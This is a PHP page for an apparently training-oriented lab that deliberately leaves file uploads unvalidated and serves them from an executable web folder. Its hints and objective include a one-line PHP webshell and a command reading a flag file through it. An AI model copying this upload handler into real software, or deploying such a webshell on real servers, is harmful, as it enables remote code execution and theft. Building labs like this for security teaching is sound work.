<?php
// Lab R2 — File Upload → Webshell
// Vulnerability: no file type validation; uploaded files served directly by PHP
require_once __DIR__ . '/includes/helpers.php';

$lab_id    = 'r2';
$flag_file = 'lab_r2.txt';

$hints = [
    1 => "The site trusts the filename and extension you give it. What type of file, if placed in a web-served folder, would the server <em>execute</em>?",
    2 => "A one-line PHP file that accepts a command parameter is a 'webshell'. Create one: <code>&lt;?php system(\$_GET['c']); ?&gt;</code>",
    3 => "Save that content as <code>shell.php</code>, upload it, then visit <code>/uploads/shell.php?c=cat /flags/lab_r2.txt</code>.",
];

$upload_msg  = null;
$upload_path = null;
$upload_err  = null;

// Handle hint reveal
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reveal_hint'])) {
    reveal_hint($lab_id, (int)$_POST['reveal_hint']);
    header("Location: /rce_r2.php");
    exit;
}

// Handle flag submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['flag'])) {
    if (check_flag($_POST['flag'], $flag_file)) {
        mark_solved($lab_id);
    } else {
        $_SESSION[flag_error_key($lab_id)] = true;
    }
    header("Location: /rce_r2.php");
    exit;
}

// Handle reset
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'reset') {
    unset($_SESSION['payloads'][$lab_id]);
    header("Location: /rce_r2.php");
    exit;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar']) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK) {
    // DELIBERATELY VULNERABLE — no validation of file type or extension
    $name = basename($_FILES['avatar']['name']);
    $dest = __DIR__ . '/uploads/' . $name;
    if (move_uploaded_file($_FILES['avatar']['tmp_name'], $dest)) {
        $upload_msg  = "Avatar uploaded to /uploads/" . $name;
        $upload_path = '/uploads/' . $name;
        log_payload($lab_id, $name, 'uploaded filename');
    } else {
        $upload_err = "Upload failed. Check that /uploads/ is writable.";
    }
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['avatar']) && $_FILES['avatar']['error'] !== UPLOAD_ERR_NO_FILE) {
    $upload_err = "Upload error code: " . $_FILES['avatar']['error'];
}

// List uploaded files
$uploaded_files = glob(__DIR__ . '/uploads/*') ?: [];

$solved         = is_solved($lab_id);
$hints_revealed = hints_revealed($lab_id);
$payload_log    = get_payload_log($lab_id);
$flag_error     = !empty($_SESSION[flag_error_key($lab_id)]);
unset($_SESSION[flag_error_key($lab_id)]);

$page_title = 'Lab R2 — File Upload Webshell';
include __DIR__ . '/includes/header.php';
?>

<div class="page lab-page">

  <?php if ($solved): ?>
  <div class="solved-banner">
    <div class="solved-banner-icon">🎉</div>
    <div>
      <div class="solved-banner-text">Lab Complete!</div>
      <div class="solved-banner-sub">You uploaded a PHP webshell and used it to read a protected flag file.</div>
    </div>
  </div>
  <?php endif; ?>

  <div class="lab-header">
    <div class="lab-header-info">
      <div class="lab-header-meta">
        <span class="badge badge-intermediate">Intermediate</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB R2</span>
        <span style="font-size:0.7rem;color:var(--text-dim)">🎤 <?= stars(4) ?> Interview · 🎯 <?= stars(3) ?> Hunt</span>
      </div>
      <h1>File Upload &rarr; Webshell</h1>
      <p class="lab-header-desc">A profile settings page accepts an avatar upload with no file-type validation. Files land in <code>/uploads/</code> — a web-served directory where PHP executes. Upload a webshell and use it to read the flag.</p>
    </div>
    <div class="lab-header-actions">
      <a href="/rce_r2_interview.php" class="btn btn-ghost btn-sm">Interview Prep</a>
      <form method="post" style="margin:0">
        <input type="hidden" name="action" value="reset">
        <button type="submit" class="btn btn-danger btn-sm" onclick="return confirm('Reset payload log?')">Reset</button>
      </form>
    </div>
  </div>

  <div class="lab-body">
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Simulated App -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Profile Settings — Avatar Upload</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">POST /rce_r2.php (multipart)</span>
        </div>
        <div class="panel-body">
          <form method="post" action="/rce_r2.php" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px;">
            <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
              <div style="width:56px;height:56px;border-radius:50%;background:var(--surface-2,#2a2a3a);border:2px dashed var(--border);display:flex;align-items:center;justify-content:center;font-size:1.4rem;">👤</div>
              <div style="flex:1;">
                <label style="font-size:0.8rem;color:var(--text-muted);display:block;margin-bottom:4px;">Upload new avatar</label>
                <input type="file" name="avatar" style="font-size:0.85rem;">
              </div>
            </div>
            <button type="submit" class="btn btn-primary btn-sm" style="align-self:flex-start;">Save Profile</button>
          </form>

          <?php if ($upload_msg): ?>
          <div class="alert alert-success" style="margin-top:12px;">
            <?= h($upload_msg) ?>
            <?php if ($upload_path): ?>
            — <a href="<?= h($upload_path) ?>" target="_blank" style="color:var(--primary)"><?= h($upload_path) ?></a>
            <?php endif; ?>
          </div>
          <?php endif; ?>

          <?php if ($upload_err): ?>
          <div class="alert alert-error" style="margin-top:12px;"><?= h($upload_err) ?></div>
          <?php endif; ?>
        </div>
      </div>

      <!-- Uploaded Files -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Uploaded Files</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($uploaded_files) ?> file(s) in /uploads/</span>
        </div>
        <div class="panel-body">
          <?php if ($uploaded_files): ?>
          <div style="display:flex;flex-direction:column;gap:6px;">
            <?php foreach ($uploaded_files as $f): ?>
            <?php $fname = basename($f); ?>
            <div style="display:flex;align-items:center;justify-content:space-between;background:var(--surface-2,#1e1e2e);padding:8px 12px;border-radius:6px;font-size:0.82rem;font-family:var(--font-mono);">
              <span style="color:var(--text)"><?= h($fname) ?></span>
              <a href="/uploads/<?= h(rawurlencode($fname)) ?>" target="_blank" class="btn btn-ghost btn-sm" style="font-size:0.72rem;">Visit</a>
            </div>
            <?php endforeach; ?>
          </div>
          <?php else: ?>
          <p class="text-muted" style="font-size:0.85rem;">No files uploaded yet.</p>
          <?php endif; ?>
        </div>
      </div>

      <!-- Vulnerable Code -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Vulnerable Source</span></div>
        <div class="panel-body">
          <div class="terminal">
            <span class="comment">// profile.php — no file type check</span><br>
            <span class="query">$name = basename($_FILES[<span style="color:var(--orange)">'avatar'</span>][<span style="color:var(--orange)">'name'</span>]);<br>
<span style="color:var(--text-dim)">// destination is inside the webroot — PHP will execute .php files</span><br>
$dest = <span style="color:var(--orange)">__DIR__ . '/uploads/' . $name</span>;<br>
move_uploaded_file($_FILES[<span style="color:var(--orange)">'avatar'</span>][<span style="color:var(--orange)">'tmp_name'</span>], $dest);<br>
echo <span style="color:var(--orange)">"Avatar saved at /uploads/$name"</span>;</span>
          </div>
        </div>
      </div>

      <!-- Objective -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Objective</span></div>
        <div class="panel-body" style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
          <div>1. Create a PHP webshell file locally (e.g. <code>shell.php</code>).</div>
          <div>2. Upload it using the form above.</div>
          <div>3. Visit <code>/uploads/shell.php?c=cat+/flags/lab_r2.txt</code> to execute your command.</div>
          <div>4. Submit the flag below.</div>
        </div>
      </div>
    </div>

    <!-- Sidebar -->
    <div style="display:flex;flex-direction:column;gap:16px;">

      <!-- Flag Submission -->
      <div class="panel">
        <div class="panel-header"><span class="panel-title">Submit Flag</span></div>
        <div class="panel-body">
          <?php if ($flag_error): ?>
          <div class="alert alert-error" data-dismiss="4000">Incorrect flag. Keep hunting.</div>
          <?php endif; ?>
          <?php if ($solved): ?>
          <div class="alert alert-success">Flag accepted! Lab complete.</div>
          <?php else: ?>
          <form method="post" class="flag-form">
            <input class="flag-input" type="text" name="flag" placeholder="HUNT{...}" autocomplete="off">
            <button type="submit" class="btn btn-primary btn-full">Submit</button>
          </form>
          <?php endif; ?>
        </div>
      </div>

      <!-- Hints -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Hints</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($hints_revealed) ?>/3 revealed</span>
        </div>
        <div class="panel-body">
          <div class="hints-list">
            <?php for ($i = 1; $i <= 3; $i++): ?>
            <div class="hint-item">
              <div class="hint-header">
                Hint <?= $i ?>
                <?php if (!in_array($i, $hints_revealed, true)): ?>
                <form method="post" style="margin:0">
                  <input type="hidden" name="reveal_hint" value="<?= $i ?>">
                  <button type="submit" class="btn btn-ghost btn-sm">Reveal</button>
                </form>
                <?php endif; ?>
              </div>
              <?php if (in_array($i, $hints_revealed, true)): ?>
              <div class="hint-content"><?= $hints[$i] ?></div>
              <?php endif; ?>
            </div>
            <?php endfor; ?>
          </div>
        </div>
      </div>

      <!-- Payload Log -->
      <div class="panel">
        <div class="panel-header">
          <span class="panel-title">Payload Log</span>
          <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)"><?= count($payload_log) ?> entries</span>
        </div>
        <div class="panel-body">
          <div class="payload-log">
            <?php if ($payload_log): ?>
            <?php foreach (array_slice($payload_log, 0, 10) as $entry): ?>
            <div class="log-entry" title="Click to copy">
              <div class="log-payload"><?= h($entry['payload']) ?></div>
              <div class="log-context"><?= h($entry['context']) ?></div>
            </div>
            <?php endforeach; ?>
            <?php else: ?>
            <div class="log-empty">No payloads yet. Start testing.</div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
